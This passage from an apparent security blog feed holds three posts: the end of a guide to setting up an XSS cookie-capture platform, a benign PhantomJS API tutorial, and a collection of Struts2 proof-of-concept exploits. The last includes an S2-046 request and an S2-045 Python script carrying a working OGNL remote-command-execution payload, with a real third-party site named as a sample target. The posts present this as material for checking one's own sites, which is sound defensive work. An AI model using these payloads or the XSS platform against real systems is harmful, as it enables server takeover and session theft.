class="variable">$_SERVER</span>[PHP_AUTH_USER]&#125;&amp;password=&#123;<span class="variable">$_SERVER</span>[PHP_AUTH_PW]&#125;"</span>); </div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>　　修改完配置以后，打开localhost，注册一个账号。注册完成后oc_user表中会新增一个记录，手动将adminlevel改为1（即管理员权限，可以有权限下放邀请码）。</p>
<p>完成以上步骤，平台差不多就可以用了，但如果遇到了一些其他问题，请继续往下看。</p>
<h3 id="Xss-Url-404问题"><a href="#Xss-Url-404问题" class="headerlink" title="Xss_Url 404问题"></a>Xss_Url 404问题</h3><p>出现的问题：当访问<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx.com/y42f59?1489555427</div></pre></td></tr></table></figure></p>
<p>等自动生成的xss_poc时，会出现404错误，这是由于url重写没有生效的缘故，主要是因为中间件配置问题。以下就apache与iis中间件，给出解决方案。</p>
<h4 id="apache解决方案"><a href="#apache解决方案" class="headerlink" title="apache解决方案"></a>apache解决方案</h4><p>首先在网站根目录添加.htaccess文件，文件内容如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&lt;IfModule mod_rewrite.c&gt;</div><div class="line">RewriteEngine On</div><div class="line">RewriteBase /</div><div class="line">RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?<span class="keyword">do</span>=code&amp;urlKey=<span class="variable">$1</span> [L]</div><div class="line">RewriteRule ^<span class="keyword">do</span>/auth/(\w+?)(/domain/([\w\.]+?))?$  /index.php?<span class="keyword">do</span>=<span class="keyword">do</span>&amp;auth=<span class="variable">$1</span>&amp;domain=<span class="variable">$3</span> [L]</div><div class="line">RewriteRule ^register/(.*?)$ /index.php?<span class="keyword">do</span>=register&amp;key=<span class="variable">$1</span> [L]</div><div class="line">RewriteRule ^register-validate/(.*?)$ /index.php?<span class="keyword">do</span>=register&amp;act=validate&amp;key=<span class="variable">$1</span> [L]</div><div class="line">&lt;/IfModule&gt;</div></pre></td></tr></table></figure></p>
<p>注意：如果网站需要域名+目录去访问的，如：www.xxx.com/xss/，则在以下代码/index.php前添加/xss/index.php。</p>
<p>然后修改apache配置文件，允许url重写。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AllowOverride None</div></pre></td></tr></table></figure></p>
<p>全部改为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">AllowOverride All</div></pre></td></tr></table></figure></p>
<p>这样，apache会根据根目录下的.htaccess文件去匹配url重写规则。</p>
<p>做完以上2条配置后访问类似于此地址，就会显示xss_poc（js）内容了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://xxx.com/y42f59?1489555427</div></pre></td></tr></table></figure></p>
<p>写文本时，我是在windows下做的测试，linux下配置方法应当一致。</p>
<h4 id="iis解决方案"><a href="#iis解决方案" class="headerlink" title="iis解决方案"></a>iis解决方案</h4><p>参考：<a href="http://www.bodkin.ren/?p=133" target="_blank" rel="external">http://www.bodkin.ren/?p=133</a></p>
<h3 id="邮件短信设置"><a href="#邮件短信设置" class="headerlink" title="邮件短信设置"></a>邮件短信设置</h3><ul>
<li>修改文件\source\function.php 257行,把里面的邮箱账号密码换一下，host改为smtp.xx.com，如：smtp.qq.com</li>
<li>飞信短信提醒功能，修改\source\api.php 72行手机号，可能只支持移动手机号。</li>
</ul>
<h3 id="老版本其他问题"><a href="#老版本其他问题" class="headerlink" title="老版本其他问题"></a>老版本其他问题</h3><p><em>新的源码不需要修改以下参数，老版本可能需要修改</em></p>
<h4 id="修改注册页面提交按钮"><a href="#修改注册页面提交按钮" class="headerlink" title="修改注册页面提交按钮"></a>修改注册页面提交按钮</h4><p>修改themes\default\templates\register.html内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input id=<span class="string">"btnRegister"</span> <span class="built_in">type</span>=<span class="string">"button"</span> onclick=<span class="string">"Register()"</span> value=<span class="string">"提交注册"</span> /&gt;</div></pre></td></tr></table></figure></p>
<p>修改为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;input id=<span class="string">"btnRegister"</span> <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"提交注册"</span> /&gt;</div></pre></td></tr></table></figure></p>
<h4 id="邀请码生成"><a href="#邀请码生成" class="headerlink" title="邀请码生成"></a>邀请码生成</h4><p>（1）将文件source\user.php第10行和50行的权限控制注释掉<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">//<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;userId&lt;=0) ShowError(<span class="string">'未登录或已超时'</span>,<span class="variable">$url</span>[<span class="string">'login'</span>],<span class="string">'重新登录'</span>);</div><div class="line">//<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;adminLevel&lt;=0) ShowError(<span class="string">'没有操作权限'</span>,URL_ROOT.<span class="string">'/index.php?do=user&amp;act=invite'</span>);</div></pre></td></tr></table></figure></p>
<p>然后访问/index.php?do=user&amp;act=invite即可生成验证码<br>（2）注册一个用户test，进入数据库，将该用户的adminLevel修改为1，然后去掉（1）中添加到注释；并在第15行case ‘invite’:处添加权限控制：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="variable">$user</span>-&gt;adminLevel&lt;=0) ShowError(<span class="string">'没有操作权限'</span>,URL_ROOT.<span class="string">'/index.php'</span>);</div></pre></td></tr></table></figure></p>
<p>（3）或者开放普通注册权限，修改文件/config.php的第18行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$config</span>[<span class="string">'register'</span>]=<span class="string">'invite'</span>;   //normal,正常;invite,只允许邀请注册;close,关闭注册功能</div></pre></td></tr></table></figure></p>
<h4 id="删除cookie"><a href="#删除cookie" class="headerlink" title="删除cookie"></a>删除cookie</h4><p>　　修改文件themes\default\templates\project_view.html中的Delete()和MultiDelete()函数，将其中post的URL修改为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'/xss/index.php?do=project&amp;act=delcontent&amp;r='</span></div></pre></td></tr></table></figure></p>
<p>即根据实际的服务器路径，在前面添加’/xss’。</p>
<h4 id="source-class-user-class-php"><a href="#source-class-user-class-php" class="headerlink" title="source\class\user.class.php"></a>source\class\user.class.php</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$this</span>-&gt;db-&gt;Execute(<span class="string">"UPDATE "</span>.<span class="variable">$this</span>-&gt;tbUser.<span class="string">" SET loginTime='"</span>.time().<span class="string">"'"</span>);</div><div class="line">修改为</div><div class="line"><span class="variable">$this</span>-&gt;db-&gt;Execute(<span class="string">"UPDATE "</span>.<span class="variable">$this</span>-&gt;tbUser.<span class="string">" SET loginTime='"</span>.time().<span class="string">"' where id=&#123;<span class="variable">$row</span>['id']&#125;"</span>);</div></pre></td></tr></table></figure>
<h4 id="修改跳转提示时间"><a href="#修改跳转提示时间" class="headerlink" title="修改跳转提示时间"></a>修改跳转提示时间</h4><p>文件themes/default/templates/notice.html：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">set</span>Timeout(<span class="string">"location.href='&#123;<span class="variable">$notice</span>.turnto&#125;'"</span>,3000);</div><div class="line">修改为</div><div class="line"><span class="built_in">set</span>Timeout(<span class="string">"location.href='&#123;<span class="variable">$notice</span>.turnto&#125;'"</span>,500);</div></pre></td></tr></table></figure></p>
<p>本文地址：<a href="http://thief.one/2017/03/15/Xss平台搭建小记/">http://thief.one/2017/03/15/Xss平台搭建小记/</a><br>转载请说明来自：<a href="http://thief.one">nMask’Blog</a></p>
]]></content>
      
        <categories>
            
            <category> web安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> xss </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Phantomjs Api介绍]]></title>
      <url>http://thief.one/2017/03/13/Phantomjs-Api%E4%BB%8B%E7%BB%8D/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">晋书云：“生犀不敢烧，燃之有异香，沾衣带，人能与鬼通”</blockquote>

<p>　　之前几篇文章介绍了Selenium+Phantomjs用法，也探讨过性能优化问题。然而利用selenium或者说python去运行phantomjs本质上并不是高效的方法，再者selenium对于phantomjs的封装并不是特别完善（长久没有更新过），因此很有必要研究下原生态的phantomjs。于是我参考<a href="http://phantomjs.org" target="_blank" rel="external">官网</a>介绍，学习总结成文，在此记录分享。<br><a id="more"></a><br>　　phantomjs全面支持web而不需要浏览器，又称为无头浏览器，它是一个基于webkit的服务端javascript API，可以用于页面自动化，网络监测，网页截图，爬虫抓取等。phantomjs有很多api接口，接口语法用的就是js的语法，phantom提供了类，实例化以后可以调用对象的方法，通过回调函数可以实现自己想要的功能，其APi主要有web服务端Api、webPage APi、System APi等，这里主要介绍几种常用的api的用法。</p>
<h3 id="phantomjs-Command-Line-Interface"><a href="#phantomjs-Command-Line-Interface" class="headerlink" title="phantomjs-Command Line Interface"></a>phantomjs-Command Line Interface</h3><p>描述：phantomjs命令行用法以及参数设置<br>首先我们看下如何调用phantomjs运行js脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">phantomjs [options] somescript.js [arg1 [arg2 [...]]]</div></pre></td></tr></table></figure></p>
<p>可选参数：（只列举常用的）</p>
<ul>
<li>–disk-cache=[true|false] 缓存设置</li>
<li>–ignore-ssl-errors=[true|false] 忽略ssl错误</li>
<li>–load-images=[true|false] 加载图片</li>
<li>–proxy=address:port  设置代理</li>
</ul>
<p>有很多参数，不一一列举，详细参考：<a href="http://phantomjs.org/api/command-line.html" target="_blank" rel="external">phantomjs-Command Line Interface</a></p>
<h3 id="phantomjs-system-module"><a href="#phantomjs-system-module" class="headerlink" title="phantomjs-system module"></a>phantomjs-system module</h3><p>描述：phantomjs系统操作APi<br>文档地址：<a href="http://phantomjs.org/api/system/" target="_blank" rel="external">phantomjs-system module</a><br>作用：用于system系统操作</p>
<h4 id="args（获取程序输入参数）"><a href="#args（获取程序输入参数）" class="headerlink" title="args（获取程序输入参数）"></a>args（获取程序输入参数）</h4><p>代码（test.js）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">var system = require(<span class="string">'system'</span>);</div><div class="line">var args = system.args;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (args.length === 1) &#123;</div><div class="line">  console.log(<span class="string">'Try to pass some arguments when invoking this script!'</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">  args.forEach(<span class="keyword">function</span>(arg, i) &#123;</div><div class="line">    console.log(i + <span class="string">': '</span> + arg);</div><div class="line">  &#125;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>运行：<br>phantomjs test.js hello<br>结果：<br>0 test.js<br>1 hello<br>功能：接受控制台输入参数。</p>
<h4 id="env（系统环境变量）"><a href="#env（系统环境变量）" class="headerlink" title="env（系统环境变量）"></a>env（系统环境变量）</h4><p>代码（test.js）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">var system = require(<span class="string">'system'</span>);</div><div class="line">var env = system.env;</div><div class="line"></div><div class="line">Object.keys(env).forEach(<span class="keyword">function</span>(key) &#123;</div><div class="line">  console.log(key + <span class="string">'='</span> + env[key]);</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>运行：phantomjs test.js<br>功能：列出系统环境变量</p>
<h4 id="os（平台类型）"><a href="#os（平台类型）" class="headerlink" title="os（平台类型）"></a>os（平台类型）</h4><p>代码（test.js）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var system = require(<span class="string">'system'</span>);</div><div class="line">var os = system.os;</div><div class="line">console.log(os.architecture);  // <span class="string">'32bit'</span></div><div class="line">console.log(os.name);  // <span class="string">'windows'</span></div><div class="line">console.log(os.version);  // <span class="string">'7'</span></div></pre></td></tr></table></figure></p>
<p>运行：phantomjs test.js<br>结果：<br>32bit<br>windows<br>7<br>功能：输出运行平台类型</p>
<h4 id="pid-（进程id）"><a href="#pid-（进程id）" class="headerlink" title="pid （进程id）"></a>pid （进程id）</h4><p>代码（test.js）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var system = require(<span class="string">'system'</span>);</div><div class="line">var pid = system.pid;</div><div class="line"></div><div class="line">console.log(pid);</div></pre></td></tr></table></figure></p>
<p>输出进程pid</p>
<h4 id="platgform（平台信息）"><a href="#platgform（平台信息）" class="headerlink" title="platgform（平台信息）"></a>platgform（平台信息）</h4><p>代码（test.js）:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var system = require(<span class="string">'system'</span>);</div><div class="line">console.log(system.platform); // <span class="string">'phantomjs'</span></div></pre></td></tr></table></figure></p>
<p>运行结果:phantomjs</p>
<h3 id="Phantomjs-web-server-module"><a href="#Phantomjs-web-server-module" class="headerlink" title="Phantomjs-web server module"></a>Phantomjs-web server module</h3><p>描述：phantomjs web server module APi<br>文档地址：<a href="http://phantomjs.org/api/webserver/method/listen.html" target="_blank" rel="external">Phantomjs-web server module</a><br>作用：作为webserver服务端，提供http服务。<br>代码（test.js）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">var webserver = require(<span class="string">'webserver'</span>);</div><div class="line">var server = webserver.create();</div><div class="line">var service = server.listen(8080, <span class="keyword">function</span>(request, response) &#123;</div><div class="line">  response.statusCode = 200;</div><div class="line">  response.setHeader(<span class="string">"Cookie"</span>,<span class="string">"1adaa2121"</span>);</div><div class="line">  response.setEncoding(<span class="string">"binary"</span>);</div><div class="line">  response.write(<span class="string">'&lt;html&gt;&lt;body&gt;Hello!&lt;/body&gt;&lt;/html&gt;'</span>);</div><div class="line">  console.log(request.method);</div><div class="line">  console.log(request.url);</div><div class="line">  console.log(request.httpVersion);</div><div class="line">  console.log(request.headers);</div><div class="line">  console.log(request.post);</div><div class="line">  console.log(request.postRaw);</div><div class="line">  response.close();</div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>运行：phantomjs test.js<br>访问：<a href="http://localhost:8080" target="_blank" rel="external">http://localhost:8080</a></p>
<p>如果要指定ip与端口，则8080可以这样写：’127.0.0.1:9999’。</p>
<p>其中有2个参数，request与response。</p>
<p>request参数方法：</p>
<ul>
<li>request.method</li>
<li>request.url</li>
<li>request.httpVersion</li>
<li>request.headers</li>
<li>request.post</li>
<li>request.postRaw</li>
</ul>
<p>用来获取请求内容。</p>
<p>response参数方法：</p>
<ul>
<li>response.headers</li>
<li>response.setheader(name,value)</li>
<li>response.header(name)</li>
<li>response.statusCode()</li>
<li>response.setEncoding(“binary”)</li>
<li>response.write(html_data)</li>
<li>response.writeHead(statusCode,headers)</li>
<li>reponse.close()</li>
<li>reponse.closeGracefully()</li>
</ul>
<h3 id="Phantomjs-web-page-module"><a href="#Phantomjs-web-page-module" class="headerlink" title="Phantomjs-web page module"></a>Phantomjs-web page module</h3><p>描述：phantomjs web page module APi<br>文档地址：<a href="http://phantomjs.org/api/webpage/" target="_blank" rel="external">Phantomjs-web page module</a><br>作用：用来发送http请求，获取网络资源，或者页面操作。</p>
<h4 id="实例化api类"><a href="#实例化api类" class="headerlink" title="实例化api类"></a>实例化api类</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">var webPage = require(<span class="string">'webpage'</span>);</div><div class="line">var page = webPage.create();</div></pre></td></tr></table></figure>
<h4 id="page方法"><a href="#page方法" class="headerlink" title="page方法"></a>page方法</h4><ul>
<li>page.content  源码</li>
<li>page.title    标题</li>
<li>page.cookie    cookie</li>
<li>page.plainText  网页内容（去除html）</li>
<li>page.setting 参数设置</li>
<li>page.url 当前url</li>
</ul>
<h4 id="clipRect剪切页面"><a href="#clipRect剪切页面" class="headerlink" title="clipRect剪切页面"></a>clipRect剪切页面</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">page.clipRect = &#123;</div><div class="line">    top: 14,</div><div class="line">    left: 3,</div><div class="line">    width: 400,</div><div class="line">    height: 300</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="content获取网页源码"><a href="#content获取网页源码" class="headerlink" title="content获取网页源码"></a>content获取网页源码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">var webPage = require(<span class="string">'webpage'</span>);</div><div class="line">var page = webPage.create();</div><div class="line"></div><div class="line">page.open(<span class="string">'http://thief.one'</span>, <span class="keyword">function</span> (status) &#123;</div><div class="line">  var content = page.content;</div><div class="line">  console.log(<span class="string">'Content: '</span> + content);</div><div class="line">  phantom.exit();</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h4 id="cookie获取页面cookie"><a href="#cookie获取页面cookie" class="headerlink" title="cookie获取页面cookie"></a>cookie获取页面cookie</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">page.open(<span class="string">'http://thief.one'</span>, <span class="keyword">function</span> (status) &#123;</div><div class="line">  var cookies = page.cookies;</div><div class="line"></div><div class="line">  console.log(<span class="string">'Listing cookies:'</span>);</div><div class="line">  <span class="keyword">for</span>(var i <span class="keyword">in</span> cookies) &#123;</div><div class="line">    console.log(cookies[i].name + <span class="string">'='</span> + cookies[i].value);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  phantom.exit();</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h4 id="设置customHeaders内容："><a href="#设置customHeaders内容：" class="headerlink" title="设置customHeaders内容："></a>设置customHeaders内容：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">page.customHeaders = &#123;</div><div class="line">  <span class="string">"X-Test"</span>: <span class="string">"foo"</span>,</div><div class="line">  <span class="string">"DNT"</span>: <span class="string">"1"</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="plainText获取网页内容（去除html只留内容）"><a href="#plainText获取网页内容（去除html只留内容）" class="headerlink" title="plainText获取网页内容（去除html只留内容）"></a>plainText获取网页内容（去除html只留内容）</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">page.open(<span class="string">'http://thief.one'</span>, <span class="keyword">function</span> (status) &#123;</div><div class="line">  console.log(<span class="string">'Stripped down page text:\n'</span> + page.plainText);</div><div class="line">  phantom.exit();</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h4 id="setting-请求头设置"><a href="#setting-请求头设置" class="headerlink" title="setting 请求头设置"></a>setting 请求头设置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var webPage = require(<span class="string">'webpage'</span>);</div><div class="line">var page = webPage.create();</div><div class="line">page.settings.userAgent = <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'</span>;</div></pre></td></tr></table></figure>
<h4 id="zoomFactor缩略图创建"><a href="#zoomFactor缩略图创建" class="headerlink" title="zoomFactor缩略图创建"></a>zoomFactor缩略图创建</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">var webPage = require(<span class="string">'webpage'</span>);</div><div class="line">var page = webPage.create();</div><div class="line"></div><div class="line">page.zoomFactor = 0.25;</div><div class="line">page.render(<span class="string">'capture.png'</span>);</div></pre></td></tr></table></figure>
<h4 id="addcookie添加cookie"><a href="#addcookie添加cookie" class="headerlink" title="addcookie添加cookie"></a>addcookie添加cookie</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">phantom.addCookie(&#123;</div><div class="line">  <span class="string">'name'</span>     : <span class="string">'Valid-Cookie-Name'</span>,   /* required property */</div><div class="line">  <span class="string">'value'</span>    : <span class="string">'Valid-Cookie-Value'</span>,  /* required property */</div><div class="line">  <span class="string">'domain'</span>   : <span class="string">'localhost'</span>,</div><div class="line">  <span class="string">'path'</span>     : <span class="string">'/foo'</span>,                /* required property */</div><div class="line">  <span class="string">'httponly'</span> : <span class="literal">true</span>,</div><div class="line">  <span class="string">'secure'</span>   : <span class="literal">false</span>,</div><div class="line">  <span class="string">'expires'</span>  : (new Date()).getTime() + (1000 * 60 * 60)   /* &lt;-- expires <span class="keyword">in</span> 1 hour */</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var webPage = require(<span class="string">'webpage'</span>);</div><div class="line">var page = webPage.create();</div><div class="line"></div><div class="line">page.uploadFile(<span class="string">'input[name=image]'</span>, <span class="string">'/path/to/some/photo.jpg'</span>);</div></pre></td></tr></table></figure>
<h4 id="render页面截图"><a href="#render页面截图" class="headerlink" title="render页面截图"></a>render页面截图</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">page.viewportSize = &#123; width: 1920, height: 1080 &#125;;</div><div class="line">page.open(<span class="string">"http://www.google.com"</span>, <span class="keyword">function</span> start(status) &#123;</div><div class="line">  page.render(<span class="string">'google_home.jpeg'</span>, &#123;format: <span class="string">'jpeg'</span>, quality: <span class="string">'100'</span>&#125;);</div><div class="line">  phantom.exit();</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>更多例子请参考：<a href="http://phantomjs.org/examples/index.html" target="_blank" rel="external">examples</a></p>
]]></content>
      
        <categories>
            
            <category> 编程之道 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Phantomjs </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Struts2漏洞POC汇总]]></title>
      <url>http://thief.one/2017/03/13/Struts2%E6%BC%8F%E6%B4%9EPOC%E6%B1%87%E6%80%BB/</url>
      <content type="html"><![CDATA[<p><blockquote class="blockquote-center">世界上一成不变的东西，只有“任何事物都是在不断变化的”这条真理。<br> —— 斯里兰卡</blockquote><br>免责申明：<em>文章中的工具以及POC等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负，如有使用于黑产者，与本文无关</em><br><a id="more"></a><br>　　Struts2框架漏洞不断，鉴于struts2使用之广泛，本文汇总Struts2系列漏洞的Poc，给网络管理员或者站长提供查询便利，以便更好的检测自身网站存在的漏洞，也可以让安全从业者更好的了解此漏洞。</p>
<p>struts2-046（2017.3）<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">POST /<span class="keyword">do</span>Upload.action HTTP/1.1</div><div class="line">Host: localhost:8080</div><div class="line">Content-Length: 10000000</div><div class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z</div><div class="line">Connection: close</div><div class="line"> </div><div class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z</div><div class="line">Content-Disposition: form-data; name=<span class="string">"upload"</span>; filename=<span class="string">"%&#123;#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')&#125;"</span></div><div class="line">Content-Type: text/plain</div><div class="line">Kaboom </div><div class="line"> </div><div class="line">------WebKitFormBoundaryAnmUgTEhFhOZpr9z--</div></pre></td></tr></table></figure></p>
<p>struts2-045（2017.3）<br>(Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">import urllib2</div><div class="line">import sys</div><div class="line">from poster.encode import multipart_encode</div><div class="line">from poster.streaminghttp import register_openers</div><div class="line"></div><div class="line">def poc(url):</div><div class="line">    register_openers()</div><div class="line">    datagen, header = multipart_encode(&#123;<span class="string">"image1"</span>: open(<span class="string">"tmp.txt"</span>, <span class="string">"rb"</span>)&#125;)</div><div class="line">    header[<span class="string">"User-Agent"</span>]=<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span></div><div class="line">    header[<span class="string">"Content-Type"</span>]=<span class="string">"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span></div><div class="line">    request = urllib2.Request(url,datagen,headers=header)</div><div class="line">    response = urllib2.urlopen(request)</div><div class="line">    body=response.read()</div><div class="line"></div><div class="line">    <span class="built_in">return</span> body</div><div class="line"></div><div class="line">url=<span class="string">"http://job.10086.cn/company/anouncement/showAnouncement.action"</span></div><div class="line">url=sys.argv[1]</div><div class="line">body=poc(url)</div><div class="line"><span class="keyword">if</span> <span class="string">"nMask"</span> <span class="keyword">in</span> body:</div><div class="line">    <span class="built_in">print</span> <span class="string">"[Loopholes exist]"</span>,url</div></pre></td></tr></table></figure></p>
